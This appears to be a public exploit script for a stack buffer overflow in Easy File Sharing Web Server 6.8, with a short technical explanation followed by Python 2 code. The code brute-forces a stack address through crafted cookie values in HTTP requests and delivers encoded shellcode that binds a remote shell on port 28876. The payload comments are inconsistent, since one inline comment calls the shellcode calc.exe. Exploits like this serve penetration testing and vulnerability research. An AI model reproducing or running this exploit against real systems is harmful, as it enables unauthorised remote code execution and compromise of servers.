# Exploit Title: Easy File Sharing Web Server 6.8 stack buffer overflow
# Date: 10 May 2014
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.efssoft.com
# Software Link: http://www.sharing-file.com/efssetup.exe
# Version: 6.8
# Tested on: English version of Windows XP Professional SP2 and SP3
#
# Description:
# By setting UserID in the cookie to a long string, we can overwrite EDX which
# allows us to control execution flow when the following instruction is
# executed:
#
# 0x0045C8C2: CALL DWORD PTR DS:[EDX+28]
#
# We can point EDX+28 to a location in the stack containing a pointer to
# instructions we want to execute. This pointer can be placed at 0x01??6969.
# Under Windows XP Professional SP2/SP3, the first, third, and fourth bytes
# in the address are always the same. The second byte is random so we need
# to bruteforce it. This takes at most 255 tries and the server doesn't crash
# so we can keep trying.
#
# The pointer placed at 0x01??6969 is a pointer to a CALL ESI. ESI points to
# a small space in our payload. We fill this small space with instructions to
# jump further down the stack where our shellcode is stored.
#
# Tested with Easy File Sharing Webserver installed in the default location at
# C:\EFS Software\Easy File Sharing Web Server
#
 
import socket
import struct
import time
import sys
 
target = "192.168.1.140"
port = 80
 
# Shellcode from https://code.google.com/p/w32-bind-ngs-shellcode/
# Binds a shell on port 28876
# msfencode -b '\x00\x20' -i w32-bind-ngs-shellcode.bin
# [*] x86/shikata_ga_nai succeeded with size 241 (iteration=1)
shellcode = (
"\xbb\xa1\x68\xde\x7c\xdd\xc0\xd9\x74\x24\xf4\x58\x33\xc9" +
"\xb1\x36\x31\x58\x14\x83\xe8\xfc\x03\x58\x10\x43\x9d\xef" +
"\xb5\xe7\xd5\x61\x76\x6c\x9f\x8d\xfd\x04\x7c\x05\x6f\xe0" +
"\xf7\x67\x50\x7b\x31\xa0\xdf\x63\x4b\x23\x8e\xfb\x81\x9c" +
"\x02\xc9\x8d\x44\x33\x5a\x3d\xe1\x0c\x2b\xc8\x69\xfb\xd5" +
"\x7e\x8a\xd5\xd5\xa8\x41\xac\x02\x7c\xaa\x05\x8d\xd0\x0c" +
"\x0b\x5a\x82\x0d\x44\x48\x80\x5d\x10\xcd\xf4\xea\x7a\xf0" +
"\x7c\xec\x69\x81\x36\xce\x6c\x7c\x9e\x3f\xbd\x3c\x94\x74" +
"\xd0\xc1\x44\xc0\xe4\x6d\xac\x58\x21\xa9\xf1\xeb\x44\xc6" +
"\x30\x2b\xd2\xc3\x1b\xb8\x57\x37\xa5\x57\x68\x80\xb1\xf6" +
"\xfc\xa5\xa5\xf9\xeb\xb0\x3e\xfa\xef\x53\x15\x7d\xd1\x5a" +
"\x1f\x76\xa3\x02\xdb\xd5\x44\x6a\xb4\x4c\x3a\xb4\x48\x1a" +
"\x8a\x96\x03\x1b\x3c\x8b\xa3\x34\x28\x52\x74\x4b\xac\xdb" +
"\xb8\xd9\x43\xb4\x13\x48\x9b\xea\xe9\xb3\x17\xf2\xc3\xe1" +
"\x8a\x6a\x47\x6b\x4f\x4a\x0a\x0f\xab\xb2\xbf\x5b\x18\x04" +
"\xf8\x72\x5e\xdc\x80\xb9\x45\x8b\xdc\x93\xd7\xf5\xa6\xfc" +
"\xd0\xae\x7a\x51\xb6\x02\x84\x03\xdc\x29\x3c\x50\xf5\xe7" +
"\x3e\x57\xf9"
)
 
print "[+] We're guessing an address on the stack. It will be a few minutes..."
 
for i in xrange(1,255):
    n = ""
    if i < 16:
        n = "0" + hex(i)[-1]
    else:
        n = hex(i)[2:]
 
    # craft the value of EDX that will be used in CALL DWORD PTR DS:[EDX+28]
    guess = "0x01" + n + "6940"
    sys.stdout.write("=");
  
    payload =  "A"*64                            # padding
    payload += "\x81\xee\x70\xff\xff\xff"        # SUB ESI,-90
    payload += "\xff\xe6"                        # JMP ESI
 
    payload += "A"*8                             # padding
    payload += struct.pack("<I", int(guess, 16)) # overwrite EDX with
                                                 # pointer to CALL ESI
 
    payload += "C"*108                           # padding
    payload += struct.pack("<I", 0x10023701)     # pointer to CALL ESI
    payload += "\x90"*20                         # NOP sled
    payload += shellcode                         # calc.exe
 
    # craft the request
    buf = (
    "GET /vfolder.ghp HTTP/1.1\r\n"
    "User-Agent: Mozilla/4.0\r\n"
    "Host:" + target + ":" + str(port) + "\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    "Accept-Language: en-us\r\n"
    "Accept-Encoding: gzip, deflate\r\n"
    "Referer: http://" + target + "/\r\n"
    "Cookie: SESSIONID=6771; UserID=" + payload + "; PassWD=;\r\n"
    "Conection: Keep-Alive\r\n\r\n"
    )
 
    # send the request and payload to the server
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.connect((target, port))
    s1.send(buf)
    s1.close()
     
    try:
        # check if we guessed the correct address by connecting to port 28876
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.connect((target, 28876))
        s2.close()
        print "\n[+] Success! A shell is waiting on port 28876!"
        break
    except Exception,e:
        pass

